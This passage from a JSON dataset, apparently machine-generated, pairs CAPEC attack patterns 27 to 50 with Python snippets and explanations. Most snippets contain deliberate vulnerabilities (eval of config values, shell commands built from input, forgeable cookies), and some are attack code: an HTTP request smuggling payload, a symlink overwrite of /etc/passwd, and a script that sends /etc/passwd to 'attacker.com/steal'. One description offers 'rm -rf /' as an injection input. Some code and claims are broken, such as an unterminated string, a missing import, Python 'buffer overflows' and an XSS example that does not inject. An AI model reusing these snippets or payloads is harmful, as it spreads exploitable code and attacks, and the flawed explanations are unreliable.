        "code_snippet": "import os\nimport threading\nimport time\n\n# Shared resource\nfile_path = 'shared_file.txt'\n\n# Function to write to the file\ndef write_to_file():\n    with open(file_path, 'w') as f:\n        f.write('Original content')\n    time.sleep(1)  # Simulate some delay\n\n# Function to replace the file\ndef replace_file():\n    time.sleep(0.5)  # Ensure this runs during the write operation\n    os.remove(file_path)\n    with open(file_path, 'w') as f:\n        f.write('Malicious content')\n\n# Create threads\nthread1 = threading.Thread(target=write_to_file)\nthread2 = threading.Thread(target=replace_file)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()\n\n# Read the file content\nwith open(file_path, 'r') as f:\n    print(f.read())",
        "description": "This Python code snippet demonstrates a race condition vulnerability. The `write_to_file` function writes 'Original content' to a shared file, while the `replace_file` function replaces the file with one containing 'Malicious content' during the write operation. The race condition occurs because the two threads are not properly synchronized, allowing the adversary to replace the file while it is being written. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and illustrates CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-363 (Race Condition Enabling Link Following)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\nimport tempfile\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file_name = temp_file.name\n\n# Simulate a delay to create a race condition\nprint(f\"Temporary file created: {temp_file_name}\")\ntime.sleep(2)  # Time window for the attacker to create a symlink\n\n# Attacker creates a symlink to a sensitive file\nsensitive_file = '/etc/passwd'\nos.symlink(sensitive_file, temp_file_name)\n\n# Privileged operation writing to the temporary file\nwith open(temp_file_name, 'w') as temp_file:\n    temp_file.write('malicious content')\n\nprint(f\"Sensitive file {sensitive_file} potentially overwritten.\")",
        "description": "This Python code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The code creates a temporary file and then introduces a delay, simulating a time window during which an attacker can create a symlink pointing to a sensitive file (e.g., '/etc/passwd'). When the privileged operation writes to the temporary file, it actually writes to the sensitive file due to the symlink, potentially overwriting it with malicious content. This example embodies the main idea of the CAPEC 'Leveraging Race Conditions via Symbolic Links' and highlights related CWEs such as TOCTOU race conditions and improper handling of symlinks."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\n\n# Function that simulates processing user input\ndef process_input(user_input):\n    try:\n        # Simulate a command execution with user input\n        command = f'echo {user_input}'\n        result = os.popen(command).read()\n        return result\n    except Exception as e:\n        return str(e)\n\n# Function to generate random input for fuzzing\ndef fuzzing_test():\n    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`\n    fuzz_input = ''.join(random.choice(chars) for _ in range(100))\n    return process_input(fuzz_input)\n\n# Run the fuzzing test\nif __name__ == '__main__':\n    print(fuzzing_test())",
        "description": "This Python code snippet demonstrates a basic fuzzing test, which is a method used to identify weaknesses in a system by feeding it randomly generated input. The `process_input` function simulates processing user input by constructing and executing a command using the input. This is vulnerable to CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) as it directly incorporates user input into a command without proper sanitization. The `fuzzing_test` function generates random input and passes it to `process_input`, simulating a fuzzing attack. This can help uncover vulnerabilities related to improper input validation (CWE-20), incomplete lists of disallowed inputs (CWE-184), and generation of error messages containing sensitive information (CWE-209). The code represents the main idea of CAPEC-28 (Fuzzing) by treating the system as a black box and using random input to discover potential weaknesses."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport time\nimport threading\n\n# Shared resource\nfile_path = 'example.txt'\n\n# Function to check and use the file\ndef check_and_use_file():\n    # Time of check\n    if os.path.exists(file_path):\n        print('File exists, proceeding to use it...')\n        # Simulate a delay\n        time.sleep(1)\n        # Time of use\n        with open(file_path, 'r') as file:\n            data = file.read()\n            print('File content:', data)\n    else:\n        print('File does not exist.')\n\n# Function to simulate an attacker modifying the file\ndef attacker_modify_file():\n    # Wait for a moment to ensure the race condition\n    time.sleep(0.5)\n    with open(file_path, 'w') as file:\n        file.write('Malicious content')\n    print('Attacker modified the file.')\n\n# Create the file initially\nwith open(file_path, 'w') as file:\n    file.write('Original content')\n\n# Create threads for the victim and attacker\nvictim_thread = threading.Thread(target=check_and_use_file)\nattacker_thread = threading.Thread(target=attacker_modify_file)\n\n# Start the threads\nvictim_thread.start()\nattacker_thread.start()\n\n# Wait for both threads to complete\nvictim_thread.join()\nattacker_thread.join()",
        "description": "This Python code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The `check_and_use_file` function checks if a file exists and then reads its content after a delay. Meanwhile, the `attacker_modify_file` function modifies the file content during the delay, creating a race condition. This example highlights the vulnerability where the state of the file can change between the check and the use, leading to unexpected behavior. The use of threading simulates concurrent execution, which is essential to demonstrate the race condition."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport time\nimport threading\n\n# Vulnerable function that simulates a privileged thread\nclass PrivilegedThread(threading.Thread):\n    def run(self):\n        while True:\n            print(\"Privileged operation\")\n            time.sleep(1)\n\n# Function to hijack the privileged thread\ndef hijack_thread(thread_id):\n    # Suspend the thread\n    ctypes.windll.kernel32.SuspendThread(thread_id)\n    # Inject malicious code (simulated by changing the thread's context)\n    # This is a simplified example and does not represent actual code injection\n    print(\"Thread hijacked!\")\n    # Resume the thread\n    ctypes.windll.kernel32.ResumeThread(thread_id)\n\n# Start the privileged thread\npriv_thread = PrivilegedThread()\npriv_thread.start()\n\n# Simulate a race condition by hijacking the thread after a delay\ntime.sleep(2)\nhijack_thread(priv_thread.ident)\n\n# Simulate improper privilege management by executing a command\nos.system(\"echo Malicious command executed\")",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution. The `PrivilegedThread` class simulates a thread performing privileged operations. The `hijack_thread` function suspends the thread, simulates injecting malicious code, and then resumes the thread. The code also includes a race condition by delaying the hijacking operation and demonstrates improper privilege management by executing a command. This example embodies the main idea of CAPEC-1000 by showing how an adversary can hijack a privileged thread to execute malicious actions, leveraging related CWEs such as privilege context switching errors, process control, and race conditions."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user authentication\n    if username == 'admin' and password == 'password':\n        # Create a cookie with sensitive information\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        resp = make_response('Logged in successfully')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id == hashlib.sha256('adminpassword'.encode()).hexdigest():\n        return 'Welcome to the admin dashboard'\n    return 'Access denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to several issues related to the CAPEC 'Accessing/Intercepting/Modifying HTTP Cookies'. The application has a login route that sets a session cookie with sensitive information (session ID) in cleartext, which is derived from the username and password. This cookie is then used to authenticate the user in the dashboard route. The code is vulnerable to several CWEs: \n- CWE-315: Cleartext Storage of Sensitive Information in a Cookie, as the session ID is stored in cleartext.\n- CWE-565: Reliance on Cookies without Validation and Integrity Checking, as the session ID is not validated for integrity.\n- CWE-311: Missing Encryption of Sensitive Data, as the session ID is not encrypted during transmission.\n- CWE-384: Session Fixation, as the session ID is not invalidated upon login.\n- CWE-539: Use of Persistent Cookies Containing Sensitive Information, as the session ID is stored in a persistent cookie.\n- CWE-642: External Control of Critical State Data, as the session ID is stored in a client-accessible cookie.\nThis code represents the main idea of the CAPEC by showing how sensitive information in cookies can be accessed, intercepted, or modified by an attacker."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS: directly embedding user input into HTML without proper sanitization\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) through HTTP query strings. The application has a single route '/search' that takes a 'query' parameter from the URL. The value of this parameter is directly embedded into the HTML response without any sanitization or escaping, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'query' parameter, which would then be executed in the victim's browser when they visit the URL. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input can lead to XSS vulnerabilities, as described in the related CWEs."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import socket\n\n# Create a socket connection to the proxy\nproxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nproxy_socket.connect(('proxy.example.com', 8080))\n\n# Craft a malicious HTTP request with smuggled headers\nmalicious_request = (\n    \"POST / HTTP/1.1\\r\\n\"\n    \"Host: victim.example.com\\r\\n\"\n    \"Content-Length: 13\\r\\n\"\n    \"Transfer-Encoding: chunked\\r\\n\"\n    \"\\r\\n\"\n    \"0\\r\\n\"\n    \"\\r\\n\"\n    \"GET /admin HTTP/1.1\\r\\n\"\n    \"Host: victim.example.com\\r\\n\"\n    \"\\r\\n\"\n)\n\n# Send the malicious request to the proxy\nproxy_socket.sendall(malicious_request.encode('utf-8'))\n\n# Receive the response from the proxy\nresponse = proxy_socket.recv(4096)\nprint(response.decode('utf-8'))\n\nproxy_socket.close()",
        "description": "This Python code snippet demonstrates an HTTP Request Smuggling attack. The attacker crafts a malicious HTTP request that exploits discrepancies in how different HTTP agents (e.g., proxies and web servers) interpret HTTP headers. The request is sent to a proxy server, which forwards it to the target web server. The smuggled request ('GET /admin HTTP/1.1') is hidden within the body of the initial request, bypassing security controls and potentially allowing unauthorized access to protected resources. This example highlights vulnerabilities related to inconsistent interpretation of HTTP requests (CWE-444), improper neutralization of CRLF sequences (CWE-113), and unintended proxy behavior (CWE-441)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport urllib.parse\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed_path = urllib.parse.urlparse(self.path)\n        query = urllib.parse.parse_qs(parsed_path.query)\n        user_input = query.get('input', [''])[0]\n\n        # Vulnerable to HTTP Response Splitting\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('Set-Cookie', f'sessionid=12345; {user_input}')\n        self.end_headers()\n        self.wfile.write(b'Hello, World!')\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a simple HTTP server that is vulnerable to HTTP Response Splitting. The server reads a query parameter 'input' from the URL, and directly includes it in the HTTP response headers without proper sanitization. This can allow an attacker to inject CRLF sequences into the 'Set-Cookie' header, potentially splitting the HTTP response and injecting malicious content. This vulnerability is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\nimport json\n\ndef load_config(file_path):\n    with open(file_path, 'r') as file:\n        config = json.load(file)\n    return config\n\n# Vulnerable function that executes code from a configuration file\n# CWE-94: Code Injection\n# CWE-96: Static Code Injection\n# CWE-95: Eval Injection\ndef execute_config(file_path):\n    config = load_config(file_path)\n    if 'command' in config:\n        # CWE-95: Using eval() with untrusted input\n        eval(config['command'])\n\n# Example usage\nconfig_file = 'config.json'\nexecute_config(config_file)",
        "description": "This Python code snippet demonstrates a vulnerability where executable code is embedded in a non-executable configuration file, aligning with the CAPEC description. The `load_config` function reads a JSON configuration file, and the `execute_config` function executes a command from the configuration file using `eval()`. This is a clear example of CWE-94 (Code Injection), CWE-96 (Static Code Injection), and CWE-95 (Eval Injection). An attacker could modify the configuration file to include malicious code, which would then be executed by the `eval()` function, leading to potential system compromise."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class SensitiveOperations:\n    def __init__(self):\n        self._secret_data = \"Sensitive Information\"\n\n    def _hidden_function(self):\n        return self._secret_data\n\n    def public_function(self):\n        return \"Public Information\"\n\n# Simulating an attacker discovering and invoking the hidden function\nsensitive_ops = SensitiveOperations()\nprint(sensitive_ops._hidden_function())  # Accessing hidden functionality without authentication or authorization",
        "description": "This Python code snippet defines a class `SensitiveOperations` with a hidden method `_hidden_function` that returns sensitive data. The hidden method is not intended to be publicly accessible, but it lacks proper authentication and authorization checks. An attacker can easily discover and invoke this hidden method to access sensitive information. This example embodies the CAPEC of 'Using Unpublished Interfaces or Functionality' and demonstrates related CWEs such as 'Missing Authentication for Critical Function' (CWE-306) and 'Missing Authorization' (CWE-862)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\n\n# CWE-312: Cleartext Storage of Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Sensitive data stored in cleartext\nsensitive_data = 'password123'\n\n# Store sensitive data in a file (cleartext storage)\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Store sensitive data in an environment variable (cleartext storage)\nos.environ['SENSITIVE_DATA'] = sensitive_data\n\n# Store sensitive data in a cookie (cleartext storage)\ncookie = f'session_id={sensitive_data}; Path=/; HttpOnly'\n\n# Store sensitive data in an executable (cleartext storage)\ndef get_sensitive_data():\n    return sensitive_data\n\n# Example of improper zeroization (CWE-226)\ndef clear_sensitive_data():\n    global sensitive_data\n    sensitive_data = None  # Data is not properly zeroized\n\n# Call the function to clear sensitive data\nclear_sensitive_data()",
        "description": "This Python code snippet demonstrates the main idea of CAPEC- Retrieve Embedded Sensitive Data by showing how sensitive information can be improperly stored and managed. The code includes examples of storing sensitive data in cleartext within a file, an environment variable, a cookie, and an executable, which correspond to CWEs 312, 314, 315, and 318. Additionally, it shows an example of improper zeroization (CWE-226) where sensitive data is set to None but not properly cleared from memory. This code highlights the risks associated with embedding sensitive data within a system and the potential for attackers to retrieve this information."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-99: Improper Control of Resource Identifiers\n\n# Simulate an environment variable that can be controlled by an attacker\nos.environ['PATH'] = '/malicious/path:' + os.environ['PATH']\n\n# Function that executes a command relying on the PATH environment variable\n# This can be exploited if '/malicious/path' contains a malicious executable\n# named 'ls' or any other commonly used command\n\ndef execute_command(command):\n    os.system(command)\n\n# Example usage\nexecute_command('ls')\n",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate the PATH environment variable to include a malicious directory. When the `execute_command` function is called with a command like 'ls', the system will search the directories listed in PATH and may execute a malicious version of 'ls' if it exists in the attacker's directory. This embodies the CAPEC concept of 'Leveraging/Manipulating Configuration File Search Paths' by showing how an attacker can influence the search path to execute malicious components. The code also touches on related CWEs by allowing external control of the search path (CWE-426, CWE-427), using an externally controlled path (CWE-73), and improperly controlling resource identifiers (CWE-99)."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response\nimport base64\n\napp = Flask(__name__)\n\n@app.route('/set_token')\ndef set_token():\n    user_id = request.args.get('user_id')\n    token = base64.b64encode(f'user_id={user_id}'.encode()).decode()\n    resp = make_response('Token set')\n    resp.set_cookie('auth_token', token)\n    return resp\n\n@app.route('/get_data')\ndef get_data():\n    token = request.cookies.get('auth_token')\n    if not token:\n        return 'No token found', 401\n    decoded_token = base64.b64decode(token).decode()\n    user_id = decoded_token.split('=')[1]\n    # No integrity check or validation of the token\n    return f'User data for user_id: {user_id}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that sets and retrieves an authentication token stored in a cookie. The token is base64 encoded but lacks integrity checks and validation, making it vulnerable to manipulation. The '/set_token' endpoint sets a cookie with a base64 encoded user_id, while the '/get_data' endpoint retrieves and decodes the token from the cookie without verifying its integrity. This embodies the CAPEC idea of 'Manipulating Opaque Client-based Data Tokens' and highlights related CWEs such as 'Missing Support for Integrity Check' (CWE-353), 'Reliance on Cookies without Validation and Integrity Checking' (CWE-565), and 'Cleartext Storage of Sensitive Information in a Cookie' (CWE-315)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\nimport sys\n\n# Simulate an attacker writing to a terminal device\nattacker_input = \"\\ncat /etc/passwd > /tmp/stolen_passwd\\n\"\n\n# Vulnerable terminal device file (e.g., /dev/pts/1)\nterminal_device = \"/dev/pts/1\"\n\ntry:\n    with open(terminal_device, 'w') as terminal:\n        terminal.write(attacker_input)\nexcept Exception as e:\n    print(f\"Error writing to terminal device: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can write malicious commands to a terminal device that is writable by other users. The attacker sends a command to copy the contents of /etc/passwd to a temporary file, which can then be accessed by the attacker. This embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as Command Injection (CWE-77), OS Command Injection (CWE-78), and Exposure of Access Control List Files (CWE-529). The code shows how an attacker can exploit a writable terminal device to execute commands with the privileges of the target user."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'attacker@example.com'\n    # Construct email headers with potential meta-characters\n    headers = f\"From: {from_address}\\nTo: {to_address}\\nSubject: {subject}\\n\"\n    # Improper neutralization of meta-characters in headers\n    msg = MIMEText(body)\n    msg.set_payload(headers + body)\n\n    # Send the email\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, to_address, msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'Hello', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email-sending function that improperly handles meta-characters in email headers. The function `send_email` constructs email headers using string interpolation, which can be exploited by an attacker to inject malicious payloads. The headers are concatenated with the email body without proper neutralization or escaping of special characters, making it susceptible to injection attacks. This example embodies the main idea of CAPEC-139, highlighting the risks associated with improper handling of meta-characters in email headers. The related CWEs provide additional context on the types of vulnerabilities present, such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\nfrom email import policy\nfrom email.parser import BytesParser\n\n# Simulate receiving an email with MIME content\nraw_email = b\"\"\"MIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\n\nThis is a test email with MIME content.\"\"\"\n\n# Parse the email\nmsg = BytesParser(policy=policy.default).parsebytes(raw_email)\n\n# Vulnerable function to convert MIME content to plain text\ndef convert_mime_to_text(mime_msg):\n    # CWE-120: Buffer Copy without Checking Size of Input\n    buffer = bytearray(1024)  # Fixed-size buffer\n    content = mime_msg.get_payload(decode=True)\n    if content:\n        for i in range(len(content)):\n            buffer[i] = content[i]  # No bounds checking\n    return buffer.decode('utf-8', errors='ignore')\n\n# CWE-20: Improper Input Validation\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\n# Convert the MIME message to plain text\nplain_text = convert_mime_to_text(msg)\nprint(plain_text)",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow, as described in the CAPEC. The code simulates receiving an email with MIME content and then attempts to convert the MIME content to plain text. The function `convert_mime_to_text` is vulnerable because it uses a fixed-size buffer (CWE-120) and does not check the size of the input before copying it into the buffer, leading to a potential buffer overflow. Additionally, the code does not properly validate the input (CWE-20), restrict operations within the bounds of the memory buffer (CWE-119), neutralize special elements (CWE-74), or handle file names/extensions securely (CWE-646). This snippet embodies the main idea of the CAPEC by illustrating how an attacker could exploit weaknesses in the MIME conversion routine to cause a buffer overflow and potentially gain control over the system."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import os\n\ndef validate_input(user_input):\n    # Early validation before filtering\n    if \";\" in user_input or \"&&\" in user_input:\n        raise ValueError(\"Invalid input detected!\")\n    return user_input\n\n\ndef filter_input(user_input):\n    # Filtering step that removes escape characters\n    return user_input.replace(\"\\\\\", \"\")\n\n\ndef execute_command(user_input):\n    # Command execution with potentially dangerous input\n    os.system(user_input)\n\ntry:\n    user_input = input(\"Enter a command: \")\n    validated_input = validate_input(user_input)\n    filtered_input = filter_input(validated_input)\n    execute_command(filtered_input)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The code first validates the user input for dangerous characters like ';' and '&&' before filtering out escape characters. This early validation can be bypassed by an attacker who provides input such as 'echo \\\\; rm -rf /'. The input passes the validation step but becomes dangerous after the filtering step, leading to potential command injection (CWE-77, CWE-78). The code highlights the risk of validating input before all transformations are applied, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import struct\n\ndef process_binary_file(file_path):\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            # Assume the first 4 bytes represent the size of the buffer\n            buffer_size = struct.unpack('<I', data[:4])[0]\n            buffer = bytearray(buffer_size)\n            # Vulnerable copy operation without checking the actual size of data\n            for i in range(len(data) - 4):\n                buffer[i] = data[i + 4]\n            print('File processed successfully')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n\n# Example usage\nprocess_binary_file('example.mp3')",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a binary file, such as an MP3. The function reads the file and assumes the first 4 bytes represent the size of a buffer. It then allocates a buffer of that size and copies the rest of the file into this buffer without checking if the actual data size exceeds the buffer size. This can lead to a buffer overflow vulnerability (CWE-120, CWE-119). The code represents the main idea of the CAPEC by showing how an attacker could exploit a buffer overflow in the handling of binary resources to execute arbitrary code."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\nimport sys\n\n# Vulnerable function that reads a symbolic link and copies its content to a buffer\n\ndef read_symlink_and_copy(link_path):\n    try:\n        # Read the symbolic link\n        target_path = os.readlink(link_path)\n        \n        # Open the target file\n        with open(target_path, 'r') as file:\n            data = file.read()\n            \n            # Vulnerable buffer copy without size check\n            buffer = bytearray(256)\n            for i in range(len(data)):\n                buffer[i] = data[i]\n            \n            print(\"Data copied to buffer:\", buffer)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <symlink_path>\")\n        sys.exit(1)\n    \n    symlink_path = sys.argv[1]\n    read_symlink_and_copy(symlink_path)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that reads a symbolic link and copies its content to a buffer without proper size checks, embodying the main idea of the CAPEC 'Buffer Overflow via Symbolic Links'. The function `read_symlink_and_copy` reads the target path of a symbolic link, opens the target file, and reads its content. It then copies the content to a fixed-size buffer (256 bytes) without checking if the content size exceeds the buffer size, leading to a potential buffer overflow (CWE-120). This code also touches on improper input validation (CWE-20) and improper restriction of operations within the bounds of a memory buffer (CWE-119)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import cgi\n\n# Simulate a configuration file with oversized strings\nconfig_data = '<config><tag>' + 'A' * 10000 + '</tag></config>'\n\n# Vulnerable function to parse the configuration data\ndef parse_config(data):\n    buffer = [0] * 1024  # Fixed-size buffer\n    for i in range(len(data)):\n        buffer[i] = ord(data[i])  # No bounds checking\n    return buffer\n\n# Simulate reading and parsing the configuration data\nform = cgi.FieldStorage()\nconfig_input = form.getvalue('config', config_data)\nparsed_data = parse_config(config_input)\n\nprint('Configuration parsed successfully')",
        "description": "This Python code snippet demonstrates a vulnerable function that parses configuration data, embodying the main idea of the CAPEC 'Overflow Variables and Tags'. The function `parse_config` reads a configuration string and attempts to copy it into a fixed-size buffer without checking the size of the input, leading to a potential buffer overflow (CWE-120). The configuration data is simulated to include an oversized string, which can cause the buffer to overflow. This example also touches on improper input validation (CWE-20) and improper restriction of operations within the bounds of a memory buffer (CWE-119). The code is designed to show how an attacker could exploit such vulnerabilities by crafting a malicious configuration file."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n\n    # CWE-131: Incorrect Calculation of Buffer Size\n    buffer_size = len(user_input) * 2\n    buffer = [''] * buffer_size\n\n    # CWE-120: Classic Buffer Overflow\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n\n    # Simulate parameter expansion\n    expanded_input = os.path.expandvars(''.join(buffer))\n\n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    for i in range(len(expanded_input)):\n        buffer[i] = expanded_input[i]  # Potential buffer overflow if expanded_input is larger than buffer\n\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 50  # This input will be expanded and may cause a buffer overflow\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerable_function` takes user input and performs several operations that lead to a buffer overflow. Initially, it validates the input type (CWE-20: Improper Input Validation). It then incorrectly calculates the buffer size (CWE-131: Incorrect Calculation of Buffer Size) by doubling the length of the input. The input is copied into the buffer without checking the size (CWE-120: Classic Buffer Overflow). The input is then expanded using `os.path.expandvars`, which can increase its size. Finally, the expanded input is copied back into the buffer without proper bounds checking (CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer), potentially causing a buffer overflow if the expanded input exceeds the buffer size."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import requests\n\n# Function that expects a URL but can be tricked into accessing local files\ndef fetch_data(url):\n    try:\n        response = requests.get(url)\n        return response.text\n    except Exception as e:\n        return str(e)\n\n# Attacker controlled input\nuser_input = 'file:///etc/passwd'\n\n# Fetch data using the user input\nresult = fetch_data(user_input)\n\n# Send the fetched data to an attacker's server\nattacker_server = 'http://attacker.com/steal'\nrequests.get(f'{attacker_server}?data={result}')",
        "description": "This Python code snippet demonstrates a vulnerability where a function expects a URL but can be tricked into accessing local files. The `fetch_data` function is designed to fetch data from a given URL using the `requests.get` method. However, if an attacker provides a local file path (e.g., 'file:///etc/passwd'), the function will read the local file instead. The fetched data is then sent to an attacker's server using another GET request, potentially exposing sensitive information. This example embodies the CAPEC 'Passing Local Filenames to Functions That Expect a URL' and incorporates related CWEs such as improper handling of unexpected data types and use of GET request method with sensitive query strings."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\n\n# Weak password requirements (CWE-521)\npassword_length = 4\nallowed_characters = string.ascii_lowercase\n\n# Simulate a brute force attack\npassword_to_crack = 'pass'\n\n# Improper restriction of excessive authentication attempts (CWE-307)\ndef brute_force_attack(password_to_crack, allowed_characters, password_length):\n    attempts = 0\n    for attempt in itertools.product(allowed_characters, repeat=password_length):\n        attempts += 1\n        attempt_password = ''.join(attempt)\n        if attempt_password == password_to_crack:\n            print(f'Password found: {attempt_password} in {attempts} attempts')\n            return attempt_password\n    print('Password not found')\n    return None\n\nbrute_force_attack(password_to_crack, allowed_characters, password_length)",
        "description": "This Python code snippet demonstrates a brute force attack on a weak password system. The password requirements are weak (CWE-521) as the password length is only 4 characters and only lowercase letters are allowed. The function `brute_force_attack` simulates a brute force attack by trying every possible combination of the allowed characters up to the specified password length. The code does not implement any measures to restrict excessive authentication attempts (CWE-307), making it susceptible to brute force attacks. The main idea of the CAPEC is represented by the function trying every possible password until it finds the correct one."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\n# Weak password recovery mechanism\nusers = {\n    'user1': {'password': '5f4dcc3b5aa765d61d8327deb882cf99', 'security_answer': 'petname'},  # 'password' hashed with MD5\n}\n\n# Function to recover password\ndef recover_password(username, security_answer):\n    if username in users and users[username]['security_answer'] == security_answer:\n        return users[username]['password']  # Returning hashed password directly\n    return 'Invalid username or security answer'\n\n# Example usage\nusername = 'user1'\nsecurity_answer = 'petname'\nrecovered_password = recover_password(username, security_answer)\nprint(f'Recovered password hash for {username}: {recovered_password}')\n",
